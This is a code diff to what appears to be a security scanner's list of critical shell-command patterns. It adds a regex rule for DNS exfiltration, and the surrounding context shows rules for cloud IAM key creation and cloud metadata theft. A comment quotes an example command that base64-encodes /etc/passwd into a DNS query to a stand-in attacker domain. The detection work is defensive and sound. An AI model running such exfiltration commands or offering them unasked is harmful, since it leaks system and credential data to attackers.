@@ -186,6 +186,22 @@ const CRITICAL_PATTERNS = [
     label: 'aws iam create-access-key / attach-user-policy / gcloud iam / az ad sp create',
     re: /\b(?:aws\s+iam\s+(?:create-access-key|create-login-profile|attach-(?:user|role|group)-policy|put-(?:user|role|group)-policy|create-(?:user|role|group))\b|gcloud\s+iam\s+(?:service-accounts\s+create|roles\s+create)\b|gcloud\s+projects\s+add-iam-policy-binding\b|az\s+ad\s+(?:sp|user)\s+create\b|az\s+role\s+assignment\s+create\b)/,
   },
+  // (v1.10.206) DNS exfil — `dig`/`host`/`nslookup`/`drill`
+  // with command-substituted query string. Attackers encode
+  // exfil data as a subdomain (`dig $(cat /etc/passwd |
+  // base64).attacker.com`) so the DNS resolver carries the
+  // payload to attacker-controlled DNS server. After denoise
+  // unwraps `$(...)` the inner reader (`cat`/`base64`/
+  // `hostname`/etc.) sits between the DNS verb and the
+  // domain — same shape regardless of the obfuscation.
+  {
+    code: 'dns-exfil',
+    label: 'dig / host / nslookup with cat/base64/whoami substituted as query (DNS exfil)',
+    // Negation excludes only `\n;` (statement separators) so
+    // the inner `|` from `$(cat ... | base64)` after denoise
+    // is allowed in the match window.
+    re: /\b(?:dig|host|nslookup|drill)\s+[^\n;]*\b(?:cat|base64|hexdump|xxd|whoami|hostname|id|uname)\b[^\n;]*\.[A-Za-z]{2,}/,
+  },
   // (v1.10.172) Cloud metadata service exfil — `curl
   // http://169.254.169.254/...` (AWS IMDS, also Azure
   // unless using IMDSv2 with token), `curl
